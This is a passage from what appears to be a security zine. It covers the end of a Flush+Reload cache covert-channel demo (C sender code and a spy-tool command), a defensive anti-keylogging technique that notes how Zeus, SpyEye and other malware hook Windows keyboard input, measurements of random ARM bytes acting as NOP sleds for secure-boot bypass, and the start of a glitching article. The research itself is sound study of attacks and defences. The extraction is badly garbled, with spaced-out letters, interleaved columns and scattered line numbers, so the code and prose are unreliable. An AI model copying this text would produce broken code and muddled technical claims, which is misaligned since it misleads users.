PROBE PADDING
PROBE PADDING
PROBE PADDING
}
}
}
}
}
}
}
}
}
}
}
}
}
41
int
43
main ( i n t a r g c , char ∗∗ a r g v ) {
char ∗p ;
char l o w e r c a s e ;
45
if
47
49
for
51
53
55
57
59
61
63
65
67
( a r g c != 2 )
return 1 ;
( p = a r g v [ 1 ] ; ∗p != 0 ; ++p ) {
// E x e c u t e t h e p r o b e c o r r e s p o n d i n g
l o w e r c a s e = ∗p | 3 2 ;
switch ( l o w e r c a s e ) {
c a s e ’ a ’ : A ( ) ; break ; c a s e ’ b ’
c a s e ’ c ’ : C ( ) ; break ; c a s e ’ d ’
c a s e ’ e ’ : E ( ) ; break ; c a s e ’ f ’
c a s e ’ g ’ : G( ) ; break ; c a s e ’ h ’
c a s e ’ i ’ : I ( ) ; break ; c a s e ’ j ’
c a s e ’ k ’ : K( ) ; break ; c a s e ’ l ’
c a s e ’m ’ : M( ) ; break ; c a s e ’ n ’
c a s e ’ o ’ : O( ) ; break ; c a s e ’ p ’
c a s e ’ q ’ : Q( ) ; break ; c a s e ’ r ’
c a s e ’ s ’ : S ( ) ; break ; c a s e ’ t ’
c a s e ’ u ’ : U ( ) ; break ; c a s e ’ v ’
c a s e ’w ’ : W( ) ; break ; c a s e ’ x ’
c a s e ’ y ’ : Y ( ) ; break ; c a s e ’ z ’
c a s e ’ ’ : SP ( ) ; break ;
}
to
:
:
:
:
:
:
:
:
:
:
:
:
:
the
B( )
D( )
F()
H( )
J ()
L()
N( )
P()
R( )
T( )
V( )
X( )
Z()
;
;
;
;
;
;
;
;
;
;
;
;
;
letter
to
send .
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
break ;
}
69
return
71
0;
}
Figure 1. Sally’s Executable
17The letter before the colon is the name of the
probe site, followed by the address to watch after
the colon. With those addresses, Robert can run
the tool and receive Sally’s messages.
1 $ . / spy −e . / msg
−p A: 0 x 4 0 7 c c 5 −p
3 −p D: 0 x 4 3 4 c f 5 −p
−p G: 0 x461d25 −p
5 −p J : 0 x48ed55 −p
−p M: 0 x4bbd85 −p
7 −p P : 0 x4e8db5 −p
−p S : 0 x515de5 −p
9 −p V: 0 x542e15 −p
−p Y: 0 x 5 6 f e 4 5 −p
−t 120 −s 20000
B: 0 x416cd5 −p C: 0 x 4 2 5 c e 5
E : 0 x443d05 −p F : 0 x452d15
H: 0 x470d35 −p I : 0 x 4 7 f d 4 5
K: 0 x49dd65 −p L : 0 x4acd75
N: 0 x4cad95 −p O: 0 x4d9da5
Q: 0 x 4 f 7 d c 5 −p R: 0 x506dd5
T: 0 x 5 2 4 d f 5 −p U: 0 x533e05
W: 0 x551e25 −p X: 0 x560e35
Z : 0 x 5 7 e e 5 5 −p _: 0 x58de65
\
\
\
\
\
\
\
\
\
The -e option is the path to Sally’s binary,
which must be exactly the same path as Sally ex-
ecutes. The -t parameter is the threshold that de-
cides what’s a fast access or not. If the memory read
is faster than that many clock cycles, it will be con-
sidered fast, which is to say that it’s in the cache.
The -s option is how often in clock cycles to check
all of the probes.
With Robert now listening for Sally’s messages,
Sally can run this command in another terminal as
another user to transmit her message.
–——–
———
—–—–
This is just the beginning. You’ll find a collec-
tion of tools and experiments that go much further
than this. 10 The attacks there use Flush+Reload to
find out which PDF file you’ve opened, which web
pages you’re visiting, and more.
$ . / msg "The q u i c k brown f o x jumps o v e r t h e
l a z y dog "
1 WARNING: This p r o c e s s o r d o e s not have an
i n v a r i a n t TSC .
D e t e c t e d ELF t y p e : E x e c u t a b l e .
3 T |H| E |_|Q|U| I | C |K|_|_| B | B | R|O|W|N|_| F |O|X|_|
J |U|M| P | S |_|O|V| E |R|_| T |H| E |_| L |A| Z |Y|_|
D|O|G|
I leave two open challenges to you fine readers:
1. Make the message-sending tool reliable, so
that it doesn’t mangle messages even a little bit.
Even cooler would be to make it a two-way reliable
chat.
2. Extend the PDF-distinguishing attack in my
poppler experiment 11 to determine which page of
pocorgtfo14.pdf is being viewed. As I’m reading
this issue of PoCkGTFO, I want you to be able to
tell which page I’m looking at through the side chan-
nel.
There’s a bit of noise in the signal (note the repli-
cated B’s), but it works! Don’t take my word for it,
try it for yourself! It’s an eerie feeling to see one
process send a message to another even though all
they’re doing is reading from memory.
Now you see what the cache really is. Not only
does it make your computer go faster, it also has this
handy feature that lets you send messages between
processes without having to go through a system
call. You’re one step closer to enlightenment.
10 git
Best of luck!
—Taylor Hornby
clone https://github.com/defuse/flush-reload-attacks
11 experiments/poppler
1814:05
Anti-Keylogging with Random Noise
by Mike Myers
In PoCkGTFO 12:7, we learned that malware is
inherently “drunk,” and we can exploit its inebria-
tion. This time, our entonnoir de gavage will be
filled with random keystrokes instead of single malt.
is applied as a change to a real-time system-
wide data struct called the Async Key State
Array.
5. Windows OS process Csrcc.exe reads the in-
put as a virtual key code, wraps it in a Win-
dows “message,” and delivers it to the message
queue of the UI thread of the user-mode ap-
plication that has keyboard focus, along with
a time-of-message update to a per-thread data
struct called the Sync Key State Array.
6. The user application’s “message pump” is a
small loop that runs in its UI thread, retriev-
ing Windows messages with GetMessage(),
translating the virtual key codes into usable
characters with TranslateMessage(), and fi-
nally sending the input to the appropriate
callback function for a particular UI element
(also known as the “Window proc”) that actu-
ally does something with the input (displays a
character, moves the caret, etc.).
Gather ’round, neighbors, as we learn about the
mechanisms behind the various Windows user-mode
keylogging techniques employed by malware, and
then investigate a technique for thwarting them all.
For more detail, official documentation of Windows
messages and Windows keyboard input can be found
in MSDN MS632586 and MS645530.
Background
Let’s start with a primer on the data flow path of
keyboard input in Windows.
Figure 2 is a somewhat simplified diagram of the
path of a keystroke from the keyboard peripheral de-
vice (top left), into the Windows operating system
(left), and then into the active application (right).
In more detail, the sequence of steps is as follows:
User-Mode Keylogging Techniques in
Malware
Malware that wants to intercept keyboard input
can attempt to do so at any point along this path.
However, for practical reasons input is usually in-
tercepted using hooks within an application, rather
than in the operating system kernel. The reasons
include: hooking in the kernel requires Adminis-
trator privilege (including, today, a way to meet
or circumvent the driver code-signing requirement);
hooking in the kernel before the keystroke reaches
the keyboard driver only obtains a keyboard device-
dependent “scan code” version of the keystroke,
rather than its actual character or key value; hook-
ing in the kernel after the keyboard driver but be-
fore the application obtains only a “virtual key code”
version of the keystroke (contextual with regard to
the keyboard “layout” or language of the OS); and
finally, hooking in the kernel means that the mal-
ware doesn’t know which application is receiving the
1. The user presses down on a key.
2. The keyboard’s internal microcontroller con-
verts key-down activity to a device-specific “s-
can code,” and issues it to keyboard’s internal
USB device controller.
3. The keyboard’s internal USB device controller
communicates the scan-code as a USB message
to the USB host controller on the host system.
The scan code is held in a circular buffer in the
kernel.
4. The keyboard driver(s) converts the scan code
into a virtual key code. The virtual key code
19Keyboard Device
User-Mode Process
USB
User32.dll
USB Host Controller Driver
Worker
Thread
Callback
UI
Thread
Worker
Thread
kbdclass.sys
Returns from ZwReadFile
GetMessage
TranslateMessage
DispatchMessage
csrcc.exe
Async Key
State Array
Sync Key
State Array
Hardware
Input Queue
Thread
Msg. Queue
Window Proc
Creates messages, sends to threads
with snapshots of key state
Figure 2. Data flow of keyboard input in Windows.
keyboard input, because the OS has not yet dis-
patched the keystrokes to the active/focused appli-
cation. This is why, practically speaking, malware
only has a handful of locations where it can inter-
cept keyboard input: upon entering or leaving the
system message queue, or upon entering or leaving
the thread message queue.
Now that we know the hooking will likely be in
user-mode, we can learn about the methods to do
user-mode keystroke logging, which include:
Journal Record Hook. Note: this method has
been disabled since Windows Vista.
• Polling the system with GetAsyncKeyState().
• Similarly, polling the system with GetKey-
boardState() or GetKeyState().
• Similarly, polling the system with GetRawIn-
putData().
• Hooking the Windows message functions
TranslateMessage(), GetMessage(), and
PeekMessage() to capture a copy of messages
as they are retrieved from the per-thread mes-
sage queue. • Using DirectX to capture keyboard input
(somewhat lower-level method).
• Creating
a
Windows
for the WH_KEYBOARD
SetWindowsHookEx(). • Stealing screenshots or enabling a remote
desktop view (multiple methods).
message
message
• Stealing clipboard contents using, e.g., Get-
ClipboardData().
hook
using
• Similarly,
creating a Windows mes-
sage hook for the so-called “LowLevel
Hook” (WH_KEYBOARD_LL) message with
SetWindowsHookEx().
• Similarly, creating a Windows message hook
for WH_JOURNALRECORD, in order to create a
20imported DispatchMessage() API. From the Dis-
patchMessage hook, our code is able to filter out
keystrokes immediately before they would otherwise
be dispatched to a Window Proc. In other words,
keystroke noise can be filtered here, at a point after
potential malware would have already logged it. The
next step is to inject the keystroke noise: our code
runs in a separate thread and uses the SendInput()
API to send random keystroke input that it gener-
ates. These keystrokes are sent into the keyboard
IO path at a point before the hooks typically used
by keylogging malware.
In order avoid sending keystroke noise that
will be delivered to a different application and
therefore not filtered, our code must also use the
SetWindowsHookEx() API to hook the Window-
Proc, in order to catch the messages that indi-
cate our application is the one with keyboard focus.
WM_SETFOCUS and WM_KILLFOCUS messages indicate
gaining or losing keyboard input focus. We can’t
catch these messages in our DispatchMessage()
hook because, unlike keyboard, mouse, paint, and
timer messages, the focus messages are not posted to
the message queue. Instead they are sent directly to
WindowProc. By coordinating the focus gained/lost
events with the sending of keystroke noise, we pre-
vent the noise from “leaking” out to other applica-
tions.
The following table lists some pieces of malware
and which method they use.
Keylogging Technique
Malware
Zeus
Hooks TranslateMessage(),
GetMessage(), PeekMessage(),
and GetClipboardData(); uses
GetKeyboardState(). 12
Sality
GetMessage(), GetKeyState(),
PeekMessage(),
TranslateMessage(),
GetClipboardData().
SpyEye
Hooks TranslateMessage(),
then uses GetKeyboardState().
Poison Ivy
Polls GetKeyboardLayout(),
GetAsyncKeyState(),
GetClipboardData(), and uses
SetWindowsHookEx().
Gh0st RAT Uses SetWindowsHookEx() with
WH_GETMESSAGE, which is another
way to hook GetMessage().
Anti-Keylogging with Keystroke Noise
One approach to thwarting keyloggers that might
seem to have potential is: Insert so many phantom
keyboard devices into the system that the malware
cannot reliably select the actual keyboard device for
keylogging. However, based upon our new under-
standing of how common malware implements key-
logging, it is clear that this approach will not be
successful, because malware does not capture key-
board input by reading it directly from the device.
Malware is designed to intercept the input at a layer
high enough as to be input device agnostic. We need
a different technique.
Our idea is to generate random keyboard activity
“noise” emanating at a low layer and removed again
in a high layer, so that it ends up polluting a mal-
ware’s keylogger log, but does not actually interfere
at the level of the user’s experience. Our approach,
shown in Figure 3, is illustrated as a modification to
the previous diagram.
Related Research
In researching our concept, we found some prior art
in the form of a European academic paper titled
NoisyKey. 13 They did not release their implemen-
tation, though, and were much more focused on a
statistical analysis of the randomness of keys in the
generated noise than in the noise channel technique
itself. In fact, we encountered several technical ob-
stacles never mentioned in their paper. We also dis-
covered a commercial product called KeystrokeIn-
terference. The trial version of KeystrokeInterfer-
ence definitely defeated the keylogging methods we
tested it against, but it did not appear to actually
create dummy keystrokes. It seemed to simply cause
keyloggers to gather incomplete data—depending on
the method, they would either get nothing at all,
only the Enter key, only punctuation, or they would
get all of the keystroke events but only the letter “A”
for all of them. Thus, KeystrokeInterference doesn’t
Technical Approach
What we have done is create a piece of dynamically
loadable code (currently a DLL) which, once loaded,
checks for the presence of User32.dll and hooks its
12 Zeus’s keylogging takes place only in the browser process, and only when Zeus detects a URL of interest. It is highly
contextual and configured by the attacker.
13 NoisyKey: Tolerating Keyloggers via Keystrokes Hiding by Ortolani and Crispo, Usenix Hotsec 2012
21Keyboard Device
User-Mode Process
USB
User32.dll
USB Host Controller Driver
UI
Thread
Worker
Thread
Anti-
Keylogger
Worker
Thread
Callback
kbdclass.sys
Returns from ZwReadFile
GetMessage
TranslateMessage
DispatchMessage
csrcc.exe
Async Key
State Array
Hardware
Input Queue
Sync Key
State Array
Thread
Msg. Queue
Window Proc
Creates messages, sends to threads
with snapshots of key state
Figure 3. A noise generating anti-keylogger plugged into the Windows keyboard data flow.
obfuscate the typing dynamics, and it appears to
have a fundamentally different approach than we
took. (It is not documented anywhere what that
method actually is.)
characters would appear together in a log.
Addressing the issue of keystroke dynamics is
more complicated. Keystroke dynamics is a term
that refers to the ability to identify a user or what
they are typing based only on the rhythms of key-
board activity, without actually capturing the con-
tent of what they are typing. By flooding the in-
put with random noise, we should break keystroke
rhythm analysis of this kind, but only if the in-
jected keystrokes have a random rhythm about them
as well. If the injected keystrokes have their own
rhythm that can be distinguished, then an attacker
could theoretically learn to filter the noise out that
way. We address this issue by inserting a random
short delay before every injected keystroke. The
random delay interval has an upper bound but no
lower bound. The delay magnitude here is related
to the rate of input described previously, but the
randomness within a small range should mean that
it is difficult or impossible to distinguish real from
injected keystrokes based on intra-keystroke timing
analysis.
Challenges
For keystroke noise to be effective as interference
against a keylogger, the generated noise should be
indistinguishable from user input. Three considera-
tions to make are the rate of the noise input, emulat-
ing the real user’s typing dynamics, and generating
the right mix of keystrokes in the noise.
Rate is fairly simple: the keystroke noise just has
to be generated at a high enough rate that it well
outnumbers the rate of keys actually typed by the
user. Assuming an expert typist who might type at
80 WPM, a rough estimate is that our noise should
be generated at a rate of at least several times that.
We estimated that about 400 keystrokes per minute,
or about six per second, should create a high enough
noise to signal ratio that it is effectively impossible
to discern which keys were typed. The goal here
is to make sure that random noise keys separate all
typed characters sufficiently that no strings of typed
Another challenge was detecting when our appli-
cation had (keyboard) input focus. It is non-trivial
for a Windows application to determine when its
22window area has been given input focus: although
there are polling-based Windows APIs that can pos-
sibly indicate which Window is in the foreground
(GetActiveWindow, GetForegroundWindow), they
are not efficient nor sufficient for our purposes.
The best solution we have at the moment is that
we installed a “Window Proc” hook to monitor for
WM_SETFOCUS and other such messages. We also
found it best to temporarily disable the keystroke
noise generation while the user was click-dragging
the window, because real keyboard input is not
simultaneously possible with dragging movements.
There are likely many other activation and focus
states that we have not yet considered, and which
will only be discovered through extensive testing.
Lastly, we had to address the need to gener-
ate keystroke noise that included all or most of
the keys that a user would actually strike, includ-
ing punctuation, some symbols, and capital letters.
This is where we encountered the difficulty with the
Shift key modifier. In order to create most non-
alphanumeric keystrokes (and to create any capital
letters, obviously), the Shift key needs to be held in
concert with another key. This means that in order
to generate such a character, we need to generate a
Shift key down event, then the other required key
down and up events, then a Shift key up event. The
problem lies in the fact that the system reacts to our
injected shift even if we filter it out: it will change
the capitalization of the user’s actual keystrokes.
Conversely, the user’s use of the Shift key will change
the capitalization of the injected keys, and our filter
routine will to fail recognize them as the ones we
recently injected, allowing them through instead.
We considered using BlockInput() to ignore the
user’s keyboard input while we generated our own,
in order to resolve a Shift state confusion. How-
ever, in practice, this API can only be called from a
High Integrity Level process (as of Windows Vista),
making it impractical. It would probably also cause
noticeable problems with keyboard responsiveness.
It would not be acceptable as a solution.
Ultimately, the solution we found was to rely
on a documented feature of SendInput() that will
guarantee non-interleaving of inputs. Instead of call-
ing SendInput() four times (Shift down, key down,
key up, Shift up) with random delays in between, we
would instead create an array of all four key events
and call SendInput once. SendInput() then ensures
that there are no other user inputs that intermingle
with your injected inputs, when performed this way.
Additionally, we use GetAsyncKeyState() immedi-
ately before SendInput in order to track the actual
Shift state; if Shift were being held down by the
user, we would not also inject an interfering Shift
key down/up sequence. Together, these precautions
The first solution we attempted was to track ev-
ery time the user hit the Shift key and every time
we injected a Shift keystroke, and deconflict their
states when doing our filter evaluation. Unfortu-
nately, this approach was prone to failure. Subtle
race conditions between Async Key State (“true” or
“system” key state, which is the basis of the Shift
key state’s affect on character capitalization) and
Sync Key State (“per-thread” key state, which is ef-
fectively what we tracked in our filter) were difficult
to debug. We also discovered that it is not possi-
ble to directly set and clear the Shift state of the
Async Key State table using an API like SetKey-
boardStateTable().
23Our compromise solution was to put back our
multiple SendInput() calls separated by delays, but
only for keys that didn’t need Shift. For keys that
need Shift to be held, we use the single SendInput()
call method that doesn’t interleave the input with
user input, but which also usually misses being
picked up by polling-based keyloggers. To account
for the fact that polling-based keyloggers would re-
ceive mostly only the slower unshifted key noise that
we generate, we increased the noise amount propor-
tionately. This hybrid approach also enables us to
somewhat model keystroke dynamics, at least for
the unshifted keystrokes whose timing we can con-
trol.
solved the issue with conflicting Shift states. How-
ever, this has the downside of taking away our ability
to model a user’s key-down-to-up rhythms using the
random delays between those events as we originally
intended.
Once we had made the change to our use of
SendInput(), we noticed that these injected noise
keys were no longer being picked up by certain meth-
ods of keylogging! Either they would completely not
see the keystroke noise when injected this way, or
they saw some of the noise, but not enough for it
to be effective anymore. What we determined was
happening is that certain keylogging methods are
based on polling for keyboard state changes, and
if activity (both a key down and its corresponding
key up) happens in between two subsequent polls, it
will be missed by the keylogger. When using Send-
Input to instantaneously send a shifted key, all four
key events (Shift key down, key down, key up, Shift
key up) pass through the keyboard IO path in less
time than a keylogger using a polling method can
detect (at practical polling rates) even though it is
fast enough to pick up input typed by a human.
Clearly this will not work for our approach. Unfor-
tunately, there is no support for managing the rate
or delay used by SendInput; if you want a key to
be “held” for a given amount of time, you have to
call SendInput twice with a wait in between. This
returns us to the problem of user input being inter-
leaved with our use of the Shift key.
PoC Results
Our keystroke noise implementation produces suc-
cessful results as tested against multiple user-mode
keylogging methods.
Input-stealing methods that do not involve key-
logging (such as screenshots and remote desktop) are
not addressed by our approach. Fortunately, these
are far less attractive methods to attackers: they
are high-bandwidth and less effective in capturing
all input. We also did not address kernel-mode key-
logging techniques with our approach, but these too
are uncommon in practical malware, as explained
earlier.
Because the keystroke noise technique is an ac-
tive technique (as opposed to a passive configuration
change), it was important to test the CPU overhead
incurred. As seen in Figure 4, the CPU overhead is
incredibly minimal: it is less than 0.3% of one core of
our test VM running on an early 2011 laptop with
a second generation 2GHz Intel Core i7. Some of
that CPU usage is due to the GUI of the demo app
itself. The RAM overhead is similarly minimal; but
again, what is pictured is mostly due to the demo
app GUI.
Figure 4. CPU and RAM usage of the PoC
keystroke noise generator.
24Conclusions
though this would seem to be a clear way to de-
feat our approach, it may not be so. Although we
have not tested it, any on-screen keyboard or re-
motely logged-on user’s key inputs supposedly come
through the system with this flag set, so a keylogger
may not want to filter on this flag. Once we pro-
pose loading kernel code to change a flag, though,
we may as well change our method of injecting input
and just avoid this problem entirely. By so doing we
could also likely address the problem of kernel-mode
keyloggers.
Although real-time keyboard input is effectively
masked from keyloggers by our approach, we did not
address clipboard-stealing malware. If a user were to
copy and paste sensitive information or credentials,
our current approach would not disrupt malware’s
ability to capture that information. Similarly, an
attacker could take a brute-force approach of cap-
turing what the user sees, and grab keyboard input
that way (screenshotting or even a live remote desk-
top session). For approaches like these, there are
other techniques that one could use. Perhaps they
would be similar to the keystroke noise concept (e.g.,
introduce noise into the display output channel, fil-
ter it out at a point after malware tries to grab it),
but that is research that remains to be done.
Console-mode applications don’t rely on Win-
dows messages, and as such, our method is not yet
compatible with them. Console mode applications
retrieve keyboard input differently, for example us-
ing the kbhit() and getkey() APIs. Likewise, any
Windows application that checks for keyboard input
without any use of Windows Messages (rare, but
theoretically possible), for example by just polling
GetKeyboardState(), is also not yet compatible
with our approach. There is nothing fundamentally
incompatible; we would just need to instrument a
different set of locations in the input path in order
to filter out injected keyboard input before it is ob-
served by console-mode applications or “abnormal”
keyboard state checking of this sort.
Another area for further development is in the
behavior of SendInput(). If we reverse engineer the
SendInput API, we may be able to reimplement it
in a way specifically suited for our task. Specifically
we would like the timing between batched input
elements to be controllable, while maintaining the
input interleaving protection that it provides when
called using batched input.
We discovered during research that a “low-
level keyboard hook” (SetWindowsHookEx() with
WH_KEYBOARD_LL) can check a flag on each call-
back called LLKHF_INJECTED, and know if the
keystroke was injected in software, e.g., by a call
to SendInput().
So in the future we would
also seek a way to prevent win32k.sys from set-
ting the LLKHF_INJECTED flag on our injected
keystrokes.
This flag is set in the kernel by
win32k.sys!XxxKeyEvent, implying that it may re-
quire kernel-level code to alter this behavior. Al-
Acknowledgments
This work was partially funded by the Halting
Attacks Via Obstructing Configurations (HAVOC)
project under Mudge’s DARPA Cyber Fast Track
program, Digital Operatives IR&D, and our famous
Single Malt Gavage Funnel. With that said, all
opinions and hyperbolic, metaphoric, gastronomic,
trophic analogies expressed in this article are the au-
thor’s own and do not necessarily reflect the views
of DARPA or the United States government.
2514:06
How likely are random bytes to be a NOP sled on ARM?
by Niek Timmers and Albert Spruyt
Howdy folks!
Any of you ever wondered what the probability
is for executing random bytes in order to do some-
thing useful? We certainly do. The team respon-
sible for analyzing the Nintendo 3DS might have
wondered about an answer when they identified the
1st stage boot loader of the security processor is
only encrypted and not authenticated. 14 This al-
lowed them to execute random bytes in the security
processor by changing the original unauthenticated,
but encrypted, image. Using a trial and error ap-
proach, they were able to get lucky when the image
decrypts into code that jumps to a memory location
preloaded with arbitrary code. Game over for the
Nintendo 3DS security processor.
We generalize the potential attack primitive of
executing random bytes by focusing on one ques-
tion: What is the probability of executing random
bytes in a NOP-like fashion? NOP-like instructions
are those that do not impair the program’s contin-
uation, such as by crashing or looping.
Writing NOPs into a code region is a powerful
method which potentially allows full control over the
system’s execution. For example, the NOPs can be
used to remove a length check, leading to an ex-
ploitable buffer overflow. One can imagine various
practical scenarios to leverage this attack primitive,
both during boot and runtime of the system.
A practical scenario during boot is related to
a common feature implemented by secure embed-
ded devices: Secure Boot. This feature provides in-
tegrity and confidentiality of code stored in external
flash. Such implementations are compromised using
software attacks 15 and hardware attacks. 16 Depend-
ing on the implementation, it may be possible to
bypass the authentication but not the decryption.
In such a situation, similar to the Nintendo 3DS,
changing the original encrypted image will lead to
the execution of randomized bytes as the decryption
key is likely unknown.
During runtime, secure embedded devices often
provide hardware cryptographic accelerators that
implement Direct Memory Access (DMA). This
functionality allows on-the-fly decryption of memory
from location A to location B. It is of utmost im-
portance to implement proper restrictions to prevent
unprivileged entities from overwriting security sensi-
tive memory locations, such as code regions. When
such restrictions are implemented incorrectly, it po-
tentially leads to copying random bytes into code
regions.
The block size of the cipher impacts the size di-
rectly: 8 bytes for T/DES and 16 bytes for AES. Ad-
ditionally the cipher mode has an impact. When the
image is decrypted using ECB, an entire block will
be pseudo randomized without propagating to other
blocks. When the image is decrypted using CBC, an
entire block will be pseudo randomized. Addition-
ally, any changes in a cipher block will propagate
directly into the plain text of the subsequent block.
In other words, flipping a bit in the cipher text will
flip the bit at the same position in the plain text of
the subsequent block. This allows small modifica-
tions of the original plain text code which potential
leads to arbitrary code execution. Further details
for such attacks are for another time.
The pseudo random bytes executed in these sce-
narios must be executed in a NOP-like fashion. This
means they need too be decoded into: valid in-
structions and have no side-effect on the program’s
continuation. The amount of different instruction
matching these requirements are target dependent.
Whenever these requirements are not met, the de-
vice will likely crash.
We approximated the probability for executing
random bytes in a NOP-like fashion for Thumb and
ARM and under different conditions: QEMU, native
user and native bare-metal. For each execution, the
probability is approximated for executing 4, 8 and
16 random bytes. Other architectures or execution
states are not considered here.
14 Arm9LoaderHax
– Deeper Inside by Jason Dellaluce
S905 SoC: bypassing the (not so) Secure Boot to dump the BootROM by Frédéric Basse
16 Bypassing Secure Boot using Fault Injection by Niek Timmers and Albert Spruyt at Black Hat Europe 2016
15 Amlogic
26Executing in QEMU Cortex A9 as a Native User
The probability of executing random bytes in a
NOP-like fashion is determined using two pieces of
software: a Python wrapper and an Thumb/ARM
binary containing NOPs to be overwritten. The binary used to approximate the probability on
a native platform in user mode is similar as listed in
Section 2. Differently, this code is executed natively
on an ARM Cortex-A9 development board. The
code is developed, compiled and executing within
the Ubuntu 14.04 LTS operating system. A disas-
sembled representation of the ARM binary is shown
below:
1 void main ( void ) {
...
3
p r i n t f ( "FREE " ) ;
asm v o l a t i l e (
5
"mov r1 , r 1 " ; //
"mov r1 , r 1 " ; //
7
"mov r1 , r 1 " ; //
"mov r1 , r 1 " ; //
9
);
p r i n t f ( "BEER! " ) ;
11
...
}
Place holder b y t e s
""
""
""
This is cross compiled for Thumb and ARM,
then executed in QEMU.
2
1 10804:
e92d4800
push
{ fp , l r }
10808:
e28db004
add
fp , sp , #4
3 1080 c :
ebfffff0
bl
107 d4 <p1>
// These b y t e s a r e u p d a t e d by t h e
5 // p y th o n wrapper b e f o r e each e x e c u t i o n .
10810:
e1a01001
mov
r1 , r 1
7 10814:
e1a01001
mov
r1 , r 1
10818:
e1a01001
mov
r1 , r 1
9 1081 c :
e1a01001
mov
r1 , r 1
10820:
ebfffff1
bl
107 e c <p2>
11 1 0 8 2 4 :
e8bd8800
pop
{ fp , pc }
arm−l i n u x −g n u e a b i h f −g c c −o t e s t −arm \
t e s t −arm . c − s t a t i c −marm (−mthumb)
qemu−arm t e s t −arm
The results of performing one thousand experi-
ments are listed in Table 2.
The results show that executing random bytes
in a NOP-like fashion is very similar between em-
ulated code and native user mode code. Let’s see
if the same probability holds up for executing bare-
metal code.
Whenever the test program prints “FREE
BEER!” the instructions executed between the two
printf calls do not impact the program’s execution
negatively; that is, the instructions are NOP-like.
The Python wrapper updates the place holder bytes
with random bytes, executes the binary, and logs the
printed result.
The random bytes originate from /dev/urandom.
Executing the updated binary results in: intended
(NOP-like) executions, unintended executions (e.g.
only “FREE” is printed) and crashes. The results of
executing the binary ten thousand times, grouped
by type, are shown in Table 1. A small percentage
of the results are unclassified.
The results show that executing random bytes
in a NOP-like fashion has potential for emulated
Thumb/ARM code. The amount of random bytes
impact the probability directly. The density of bad
instructions, where the program crashes, is higher
for Thumb than for ARM. Let’s see if the same prob-
ability holds up for executing native code.
27Cortex A9 as Native Bare Metal
The binary used to approximate the probability on
native platform in bare metal mode is implemented
in U-Boot. The code is very similar to that which
we used on Qemu and in userland. U-Boot is only
executed during boot and therefore the platform is
executed before each experiment. The target’s serial
interface is used for communication. A new com-
mand is added to U-Boot which is able to receive
random bytes via the serial interface, update the
placeholder bytes and execute the code.
All ARM CPU exceptions are handled by U-
Boot which allows us to classify the crashes ac-
cordingly. For example, the following exception is
printed on the serial interface when the random
bytes result in a illegal exception:
1 FREE u n d e f i n e d i n s t r u c t i o n
pc :
[ <1 f f 5 0 2 1 8 >]
l r : [ <1 f f 5 0 2 0 c >]
3 r e l o c pc : [ <04016218 >]
l r : [ <0401620 c >]
sp : 1 e b 1 9 e 6 8
i p : 0000000 c f p : 00000000
5 r 1 0 : 00000000 r 9 : 1 e b 1 9 e e 8
r8 : 1 c091c09 r7 : 1 f f 5 0 3 f c
r6 : 1 f f 5 0 3 f c
7 r 5 : 00000000 r 4 : 1 f f 5 0 2 1 4
r3 : e0001000
r 2 : 0000080 a r 1 : 1 f f 5 0 2 1 4
r 0 : 00000005
9 F l a g s : nZCv IRQs o f f
FIQs o f f Mode SVC_32
R e s e t t i n g CPU . . .
The results of performing one thousand experi-
ments are listed in Table 3.
The results show that executing random bytes
in a NOP-like fashion is similar for bare-metal code
compared to emulated and native user mode code.
There seems to be less difference between Thumb
and ARM but that could be due statistics.
Conclusion
Let us wonder no more. The results of this arti-
cle tell us that the probability for executing random
bytes in a NOP-like fashion for Thumb an ARM is
significant enough to consider it a potentially rele-
vant attack primitive. The probability is very simi-
lar for execution of emulated code, native user-mode
code and bare-metal code. The number of ran-
dom bytes executed impact the probability directly
which matches our common sense. In Thumb mode,
the density of bad instructions where the program
crashes is higher than for ARM. One must realize
the true probability for a given target cannot be
determined in a generic fashion, thanks to memory
mapping, access restrictions, and the surrounding
code.
28Type
NOP-like
Illegal instruction
Segmentation fault
Unhandled CPU exception
Unhandled ARM syscall
Unhandled Syscall
Unclassified
4 bytes
32% / 52%
11% / 20%
52% / 23%
1% / 2%
1% / 0%
1% / 1%
5% / 3%
8 bytes
13% / 34%
14% / 29%
66% / 31%
0% / 3%
1% / 1%
0% / 0%
6% / 2%
16 bytes
4% / 13%
15% / 41%
73% / 40%
0% / 4%
1% / 1%
0% / 0%
6% / 1%
Table 1. Probabilities for QEMU (Thumb / ARM)
Type
NOP-like
Illegal instruction
Segmentation fault
Bus error
Unclassified
4 bytes
36% / 61%
13% / 19%
48% / 19%
0% / 1%
3% / 0%
8 bytes
13% / 39%
17% / 27%
66% / 33%
0% / 1%
4% / 0%
16 bytes
2% / 12%
23% / 40%
71% / 46%
0% / 2%
4% / 0%
Table 2. Probabilities for native user (Thumb / ARM)
Type
NOP-like
Undefined Instruction
Data Abort
Prefetch Abort
Unclassified
4 bytes
53% / 63%
16% / 20%
17% / 4%
1% / 1%
15% / 12%
8 bytes
32% / 41%
19% / 34%
25% / 7%
1% / 1%
23% / 18%
16 bytes
7% / 19%
25% / 51%
33% / 11%
2% / 1%
33% / 18%
Table 3. Probabilities for native bare metal (Thumb / ARM)
2914:07
Routing Ethernet over GDB and SWD for Glitching
by Micah Elizabeth Scott
Hello again friendly and distinguished neighbors!
As you can see, I’ve already started compliment-
ing you, in part to distract from the tiny horrors
ahead. Lately I’ve been spending some time ex-
perimenting on chips, injecting faults, and gener-
ally trying to guess how they are programmed. The
results are a delightful topic that we have visited
some in the past, and I’ll surely weave some new sto-
ries about my results in the brighter days to come.
For now, deep in the thick of things, you see, the
glitching is monotonous work. Today’s article is a
tidbit about one particular solution to a problem I
found while experimenting with voltage glitching a
network-connected microcontroller.
modified to account for the time difference. An SPI
peripheral easily accepts a range of SCLK frequen-
cies, but a serial port expecting 115,200 baud will
have to know it’s getting 25,920 baud instead. Most
serial peripherals can handle this perfectly accept-
ably, but you may notice that operating systems and
programming APIs start to turn their nose up at
such a strange bit rate. Things become even less
convenient with fixed-rate protocols like USB and
Ethernet.
As fun as it would be to implement a custom
Ethernet PHY that supports arbitrary clock scal-
ing, it’s usually more practical to extend the time
bubble, slowing the input clock presented to an oth-
erwise mundane Ethernet controller. For this tech-
nique to work, the peripheral needs a flexible inter-
facing clock. A USB-to-Ethernet bridge like the one
on-board a Raspberry Pi could be underclocked, but
then it couldn’t speak with the USB host controller.
PCI Express would have a similar problem.
SPI peripherals are handy for this purpose. My
earlier Facewhisperer mashup of Facedancer and
ChipWhisperer spoke underclocked USB by includ-
ing a MAX3421E chip in the victim device’s time
domain. This can successfully break free from the
